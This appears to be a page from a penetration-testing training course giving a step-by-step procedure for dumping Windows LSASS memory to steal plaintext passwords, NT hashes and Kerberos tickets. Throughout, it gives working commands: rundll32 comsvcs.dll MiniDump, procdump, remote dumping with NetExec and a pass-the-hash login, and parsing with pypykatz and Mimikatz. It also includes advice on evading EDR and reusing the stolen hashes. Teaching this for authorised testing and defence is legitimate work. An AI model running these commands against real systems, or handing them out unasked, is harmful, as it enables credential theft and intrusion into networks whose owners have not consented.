---
title: Dump credentials from LSASS
slug: attack-lsass
area: windows
module: 10
order: 2
goal: Pull plaintext passwords, NT hashes and Kerberos tickets out of the LSASS process on a Windows host.
summary: How to attack LSASS — dump it with Task Manager, comsvcs.dll, nanodump or procdump, or read it remotely with NetExec, then parse with pypykatz or Mimikatz.
prereqs: [Local admin / SeDebugPrivilege on the target (or SYSTEM), A way to move the dump off the box, Awareness that AV/EDR watches LSASS access closely]
seeAlso: [tool:mimikatz, tool:netexec, tool:secretsdump, map:password-cracking, map:credential-access]
references:
  - HackTricks: stealing credentials (LSASS) | https://book.hacktricks.wiki/en/windows-hardening/stealing-credentials/index.html
  - pypykatz | https://github.com/skelsec/pypykatz
---

LSASS holds the secrets of everyone logged on: NT hashes, sometimes plaintext (WDigest/older), and Kerberos tickets. Dump the process to a file, carry it to your box, and parse it offline — that keeps the noisy Mimikatz off the target.

## Make the dump on the target

Any of these produce an `lsass.dmp`. `comsvcs.dll` is a living-off-the-land favourite (no upload).

```cmd
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\temp\lsass.dmp full
procdump.exe -accepteula -ma lsass.exe C:\temp\lsass.dmp
```

```text
Task Manager -> Details -> lsass.exe -> right-click -> Create dump file   (GUI, SYSTEM session)
```

## Or dump it remotely (NetExec)

With admin creds/hash, NetExec dumps and parses LSASS over the wire in one go.

```bash
nxc smb TARGET -u Administrator -H <nthash> -M lsassy
nxc smb TARGET -u Administrator -p 'Pass!' --lsa            # LSA secrets / cached logons
```

## Parse the dump off-box

```bash
pypykatz lsa minidump lsass.dmp
```

```cmd
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit
```

## If it fails

- **Access denied opening LSASS**: you aren't admin or lack SeDebugPrivilege — escalate first, or run from a SYSTEM shell.
- **Dump blocked / process killed**: EDR or LSA Protection (RunAsPPL) is on. Try a stealthier dumper (nanodump), or pivot to the SAM/secretsdump route instead.
- **No plaintext, only hashes**: normal on modern Windows (WDigest off) — pass or crack the NT hashes.
- **Huge/truncated dump**: use `-ma` / `full` for a complete minidump; a partial one won't parse.

## Verify

```bash
pypykatz lsa minidump lsass.dmp | grep -iE 'NT:|password'   # hashes/plaintext present
```

Got hashes? Reuse them straight away — see Pass-the-Hash.
